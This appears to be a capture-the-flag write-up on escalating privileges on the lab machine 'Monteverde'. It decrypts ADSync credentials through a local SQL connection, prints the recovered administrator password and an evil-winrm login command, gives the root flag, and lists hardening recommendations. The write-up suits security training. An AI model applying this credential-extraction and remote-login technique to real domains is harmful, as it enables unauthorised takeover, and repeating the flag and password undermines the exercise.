# Privilege Escalation — Monteverde

This section documents the steps taken to escalate privileges from the initially compromised `mhope` account to the domain `administrator` account and to obtain the root flag.

## Exploitation Summary

1. A local proof-of-concept decryption script (modified to connect to the local SQL instance) was executed to decrypt ADSync configuration and reveal the domain Administrator credentials.

```ps1
# Example: connect to local ADSync database and run decrypt script
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost; Integrated Security=true;Initial Catalog=ADSync"
$client.Open()
# Run POC; returned password: d0m@in4dminyeah!
```

2. Using the recovered Administrator credentials, an authenticated WinRM session was established as `administrator`.

```sh
evil-winrm-py -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
# Obtained root flag: ce0899bf0e75ac4ced4945bd00e6613b
```

**Result:** Full compromise of the host was achieved and the root flag was retrieved.

## Recommendations (Technical)

- Rotate credentials and reset accounts whose secrets were exposed during the assessment.
- Restrict EXECUTE permissions on legacy extended procedures such as `xp_dirtree` to administrative principals only. Consider disabling unused extended procedures.
- Secure ADSync configuration: ensure encrypted secrets are protected and access to the ADSync database is limited to the service account and administrators. Audit and rotate service account credentials.
- Harden remote management: limit WinRM exposure and enforce MFA/proxying for administrative access where possible.

## Artifacts

Captured artifacts and credentials are documented in the engagement files. Store all artifacts in a secure, access-controlled archive for remediation and forensics.

